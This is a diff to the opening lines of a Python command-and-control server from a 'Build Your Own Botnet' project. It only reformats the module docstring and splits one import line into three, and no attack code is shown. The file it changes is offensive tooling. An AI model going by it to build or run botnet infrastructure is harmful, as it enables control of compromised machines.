@@ -1,8 +1,8 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Command & Control (Build Your Own Botnet)'
+""" 
+Command & Control (Build Your Own Botnet)
 
-__doc__ =  """ 
 
 88                                  88
 88                                  88
@@ -51,7 +51,9 @@ except:
     pass
 
 # modules
-from core import util, database, handlers
+import core.util
+import core.database
+import core.handlers
 
 # globals
 packages  = ['socketserver','cv2','colorama']
